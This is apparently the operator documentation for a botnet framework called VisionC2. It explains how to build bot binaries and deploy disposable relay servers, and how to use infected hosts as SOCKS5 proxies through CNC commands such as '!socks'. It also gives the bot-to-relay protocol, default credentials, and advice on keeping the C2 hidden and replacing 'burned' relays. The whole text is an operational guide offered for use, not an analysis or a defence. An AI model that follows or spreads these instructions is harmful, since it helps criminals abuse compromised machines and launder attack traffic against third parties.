# SOCKS5 Proxy & Relay Server

VisionC2 supports two SOCKS5 proxy modes: **backconnect** (via relay server) and **direct** (local listener on bot).

---

## Architecture

### Backconnect Mode (Recommended)

```
User ──[SOCKS5]──▶ Relay Server ◀──[backconnect TLS]── Bot ──▶ Target
                   (your VPS)                          (infected host)
```

- Bot connects **OUT** to the relay — never opens a port
- Users connect to the relay's SOCKS5 port with credentials
- C2 address is never exposed — relay is separate infrastructure
- If the relay gets burned, deploy a new one without touching the C2

### Direct Mode

```
User ──[SOCKS5]──▶ Bot:1080 ──▶ Target
```

- Bot opens a SOCKS5 listener directly on a port
- Simpler, but exposes the bot's IP and opens an inbound port
- Use when you don't need relay infrastructure

---

## Quick Start

### 1. Build Everything

```bash
python3 setup.py    # Option 1: Full Setup
```

During setup you'll be asked for:
- **Relay endpoints** — comma-separated `host:port` (e.g. `relay1.example.com:9001,relay2.example.com:9001`)
  - Press Enter to skip if you'll specify at runtime
- **Proxy credentials** — default username/password for SOCKS5 auth (default: `vision:vision`)

Setup builds three binaries:
- `server` — CNC server
- `relay_server` — relay server
- `bins/` — bot binaries (14 architectures)

### 2. Deploy the Relay

Copy `relay_server` to a VPS (**not** your C2 server):

```bash
# Minimal — auth key is baked in from setup.py
./relay_server

# With stats monitoring
./relay_server -stats 127.0.0.1:9090

# Custom ports
./relay_server -cp 9001 -sp 1080 -stats 127.0.0.1:9090

# With your own TLS cert
./relay_server -cert server.crt -keyfile server.key
```

**Default ports:**
| Port | Purpose |
|------|---------|
| 9001 | Control port (TLS) — bots connect here |
| 1080 | SOCKS5 port — proxy clients connect here |

### 3. Activate from CNC

**TUI mode** — go to Socks Manager (option 3 on main menu):
- `s` — Quick start (uses pre-configured relay + credentials)
- `c` — Custom relay (enter relay:port manually)
- `d` — Direct mode (enter port, opens listener on bot)
- `x` — Stop proxy

**Split/telnet mode:**
```
!socks                          # Use pre-configured relays
!socks relay.example.com:9001   # Specific relay
!socks r1:9001,r2:9001          # Multiple relays (comma-separated)
!socks 1080                     # Direct mode (local listener on port 1080)
!stopsocks                      # Stop proxy
!socksauth newuser newpass      # Change credentials at runtime
```

### 4. Connect as a User

```bash
# curl
curl --socks5 relay.example.com:1080 -U vision:vision http://target.com

# proxychains (add to /etc/proxychains4.conf)
socks5 relay.example.com 1080 vision vision

# Direct mode (no relay)
curl --socks5 BOT_IP:1080 -U vision:vision http://target.com
```

---

## Relay Server Reference

### Command-Line Flags

| Flag | Default | Description |
|------|---------|-------------|
| `-cp` | `9001` | Control port for bot backconnect (TLS) |
| `-sp` | `1080` | SOCKS5 port for proxy clients |
| `-key` | (built-in) | Auth key override — defaults to key baked in by setup.py |
| `-cert` | (auto) | TLS certificate file — auto-generates self-signed if empty |
| `-keyfile` | (auto) | TLS private key file |
| `-stats` | (off) | Stats endpoint address (e.g. `127.0.0.1:9090`) |

### Stats Monitoring

Start with `-stats`:
```bash
./relay_server -stats 127.0.0.1:9090
```

Check stats:
```bash
nc 127.0.0.1 9090
```

Output:
```
╔══════════════════════════════════════════════╗
║          RELAY STATUS                        ║
╠══════════════════════════════════════════════╣
  Sessions total:    42
  Sessions active:   3
  Sessions failed:   1
  Bandwidth up:      12.45 MB
  Bandwidth down:    89.23 MB
  Bandwidth total:   101.68 MB
  Bot connects:      5
  Auth failures:     0
╠══════════════════════════════════════════════╣
║          CONNECTED BOTS                      ║
╠══════════════════════════════════════════════╣
  BOT ID       REMOTE ADDR            UPTIME
  ────────────────────────────────────────────
  a1b2c3d4     203.0.113.50:49281     2h15m30s
  e5f6g7h8     198.51.100.22:52104    45m12s
╠══════════════════════════════════════════════╣
  Pending sessions:  0
╚══════════════════════════════════════════════╝
```

### Relay Protocol

```
Bot → Relay:   RELAY_AUTH:<key>:<botID>\n     (authenticate)
Relay → Bot:   RELAY_OK\n                     (accepted)
Relay → Bot:   RELAY_NEW:<sessionID>\n        (new client waiting)
Bot → Relay:   RELAY_DATA:<sessionID>\n       (data channel)
Bot → Relay:   RELAY_PING\n                   (keepalive, every 60s)
```

---

## Multi-Relay Failover

Bots support unlimited relay endpoints with automatic failover:

1. **Shuffle on startup** — bots randomize the relay list so they spread across relays
2. **Quick rotation** — on disconnect, bot tries the next relay (0.5–2s jitter)
3. **Exponential backoff** — after all relays fail one full rotation, wait 5s → 10s → 20s → 40s → 60s (cap)
4. **Auto-reconnect** — keeps trying until `!stopsocks` is issued

### Configure Multiple Relays

**At build time (setup.py):**
```
Relay endpoints: relay-us.example.com:9001,relay-eu.example.com:9001,relay-ap.example.com:9001
```

**At runtime (CNC):**
```
!socks relay-us.example.com:9001,relay-eu.example.com:9001
```

Pre-configured endpoints are always appended as fallbacks when specifying at runtime.

---

## Credentials

### Default Credentials

Set during `setup.py` — baked into the bot binary:
- Default: `vision:vision`
- All SOCKS5 connections require these credentials

### Change at Runtime

From CNC:
```
!socksauth myuser mypass
```

This updates credentials on all bots. Takes effect immediately for new connections.

### Update in Config

`python3 setup.py` → Option 3 (Relay Endpoints Update) lets you change default credentials and rebuild.

---

## Updating Relay Endpoints

### Option 3 in setup.py

```bash
python3 setup.py    # Select option 3
```

This will:
1. Show current relay endpoints (decrypted)
2. Let you enter new endpoints (comma-separated)
3. Update proxy credentials
4. Re-encrypt all config blobs with fresh AES key
5. Rebuild relay + bot binaries

**Existing deployed bots will NOT auto-update** — you must redeploy the new bot binaries.

### Runtime Override

If you need to point bots at a new relay without redeploying:
```
!socks newrelay.example.com:9001
```

---

## Security Notes

- **Relay is disposable** — deploy on cheap VPS, burn and replace as needed
- **C2 never exposed** — bot connects to relay, not the other way around
- **TLS everywhere** — bot↔relay uses TLS 1.2+ (same as bot↔C2)
- **Auth required** — both bot→relay (magic code) and user→SOCKS5 (credentials) are authenticated
- **Bind stats to localhost** — always use `127.0.0.1` for the `-stats` flag, never `0.0.0.0`
- **Separate relay from C2** — the whole point is isolation; don't run both on the same server
